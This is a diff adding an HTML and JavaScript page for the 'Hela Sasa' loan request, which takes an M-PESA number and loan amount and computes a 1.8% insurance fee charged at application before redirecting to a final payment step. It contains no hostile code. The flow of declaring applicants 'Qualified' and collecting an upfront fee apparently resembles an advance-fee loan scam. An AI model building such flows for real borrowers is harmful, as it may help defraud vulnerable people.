@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hela Sasa | Loan Request</title>
+<style>
+  :root {
+    --green: #1a6b3f;
+    --green-dark: #124a2b;
+    --green-pale: #e3f2e8;
+    --page-bg: #e5e3d6;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    background: var(--page-bg);
+    color: #1c2620;
+    min-height: 100vh;
+  }
+
+  main {
+    max-width: 620px;
+    margin: 0 auto;
+    padding: 48px 20px 60px;
+    text-align: center;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--green-pale);
+    color: var(--green-dark);
+    font-size: 13px;
+    font-weight: 700;
+    padding: 7px 16px;
+    border-radius: 999px;
+    margin-bottom: 26px;
+  }
+
+  h1 {
+    font-size: 40px;
+    font-weight: 800;
+    line-height: 1.15;
+    margin: 0 0 14px;
+    color: #16201a;
+  }
+
+  .subtitle {
+    font-size: 15.5px;
+    color: #5b6259;
+    margin-bottom: 34px;
+  }
+
+  .card {
+    background: #fff;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    padding: 36px 34px;
+    text-align: left;
+  }
+
+  label {
+    display: block;
+    font-size: 14px;
+    font-weight: 700;
+    color: #24312a;
+    margin-bottom: 8px;
+  }
+
+  .input-wrap {
+    display: flex;
+    align-items: center;
+    background: #edeae0;
+    border-radius: 10px;
+    margin-bottom: 22px;
+    overflow: hidden;
+  }
+  .input-wrap .prefix {
+    padding: 14px 14px 14px 16px;
+    font-size: 15px;
+    color: #6f6f60;
+    font-weight: 600;
+    display: flex;
+    align-items: center;
+  }
+  .input-wrap input {
+    flex: 1;
+    border: none;
+    background: transparent;
+    padding: 14px 16px 14px 0;
+    font-size: 16px;
+    outline: none;
+    color: #1c2620;
+    font-weight: 600;
+  }
+  .hint { font-size: 12.5px; color: #7d8479; margin: -14px 0 22px; }
+
+  .fee-box {
+    background: var(--green-pale);
+    border-radius: 12px;
+    padding: 16px 18px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 26px;
+  }
+  .fee-box .fee-label { font-size: 13.5px; font-weight: 700; color: #2d6b46; }
+  .fee-box .fee-sub { font-size: 12px; color: #5c7d68; margin-top: 2px; }
+  .fee-box .fee-amount { font-size: 15px; color: #5c7d68; font-weight: 600; }
+  .fee-box .fee-amount b { font-size: 24px; color: var(--green-dark); font-weight: 800; margin-left: 3px; }
+
+  button.continue {
+    width: 100%;
+    background: var(--green-dark);
+    color: #fff;
+    border: none;
+    padding: 17px;
+    border-radius: 999px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-bottom: 16px;
+  }
+  button.continue:hover { background: #0d3a21; }
+  button.continue:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .goback {
+    display: block;
+    text-align: center;
+    font-size: 14px;
+    color: #6f7a68;
+    text-decoration: none;
+  }
+  .goback:hover { color: #24312a; }
+
+  .error { color: #b3401f; font-size: 13px; margin: -14px 0 18px; display: none; }
+</style>
+</head>
+<body>
+
+<main>
+  <div class="badge">✅ Qualified — Step 3 of 4</div>
+
+  <h1>Enter your loan details</h1>
+  <div class="subtitle">You're almost there! Enter your M-PESA number and the amount you need.</div>
+
+  <div class="card">
+    <form id="loanForm">
+      <label for="phone">M-PESA Phone Number</label>
+      <div class="input-wrap">
+        <span class="prefix">📱</span>
+        <input type="tel" id="phone" placeholder="0712345678" required>
+      </div>
+
+      <label for="amount">Loan Amount (Minimum Ksh 2,000)</label>
+      <div class="input-wrap">
+        <span class="prefix">KSH</span>
+        <input type="number" id="amount" min="2000" step="1" placeholder="9000" required>
+      </div>
+      <div class="error" id="amountError">Enter an amount of at least Ksh 2,000</div>
+
+      <div class="fee-box">
+        <div>
+          <div class="fee-label">1.8% INSURANCE FEE</div>
+          <div class="fee-sub">One-time, paid at application</div>
+        </div>
+        <div class="fee-amount">KSH<b id="feeOut">0</b></div>
+      </div>
+
+      <button type="submit" class="continue" id="continueBtn">Continue →</button>
+    </form>
+
+    <a class="goback" href="javascript:history.back()">← Go back</a>
+  </div>
+</main>
+
+<script>
+  const phoneInput = document.getElementById('phone');
+  const amountInput = document.getElementById('amount');
+  const feeOut = document.getElementById('feeOut');
+  const amountError = document.getElementById('amountError');
+  const form = document.getElementById('loanForm');
+
+  // Prefill from query params carried over from display.php, if present
+  const params = new URLSearchParams(window.location.search);
+  if (params.get('phone')) phoneInput.value = params.get('phone').replace(/^254/, '0');
+  if (params.get('loanAmount')) amountInput.value = params.get('loanAmount');
+
+  function recalcFee() {
+    const amount = Number(amountInput.value) || 0;
+    const fee = Math.round(amount * 0.018);
+    feeOut.textContent = fee.toLocaleString('en-KE');
+  }
+
+  amountInput.addEventListener('input', recalcFee);
+  recalcFee();
+
+  function normalizeMsisdn(raw) {
+    const digits = raw.replace(/\D/g, '');
+    if (digits.startsWith('254')) return digits;
+    if (digits.startsWith('0')) return '254' + digits.slice(1);
+    if (digits.startsWith('7') || digits.startsWith('1')) return '254' + digits;
+    return digits;
+  }
+
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const amount = Number(amountInput.value) || 0;
+    if (amount < 2000) {
+      amountError.style.display = 'block';
+      return;
+    }
+    amountError.style.display = 'none';
+
+    const msisdn = normalizeMsisdn(phoneInput.value.trim());
+
+    // Hand off to the final step: it calculates the fee itself and charges
+    // that, not the full loan amount.
+    window.location.href =
+      window.location.origin + '/final-step.php?loanAmount=' + amount +
+      '&phone=' + encodeURIComponent(msisdn);
+  });
+</script>
+
+</body>
+</html>
